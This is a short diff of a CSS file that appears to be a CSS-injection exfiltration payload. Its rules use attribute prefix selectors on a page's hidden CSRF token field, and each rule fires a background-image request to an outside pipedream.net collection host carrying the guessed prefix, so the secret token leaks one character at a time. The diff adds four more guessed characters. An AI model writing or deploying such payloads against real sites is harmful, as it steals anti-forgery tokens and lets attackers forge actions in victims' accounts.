@@ -38,6 +38,18 @@ input[name="csrf"][value^="ruW-tj-"] {
 input[name="csrf"][value^="ruW-tj:"] {
   background: url(https://en6gc9c8vfzvo.x.pipedream.net/?0=ruW-tj:)
 }
+input[name="csrf"][value^="ruW-tj&"] {
+  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?0=ruW-tj&)
+}
+input[name="csrf"][value^="ruW-tj?"] {
+  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?0=ruW-tj?)
+}
+input[name="csrf"][value^="ruW-tj!"] {
+  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?0=ruW-tj!)
+}
+input[name="csrf"][value^="ruW-tj="] {
+  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?0=ruW-tj=)
+}
 
 input[name="csrf"][value^="ruW-tja"] {
   background: url(https://en6gc9c8vfzvo.x.pipedream.net/?0=ruW-tja)
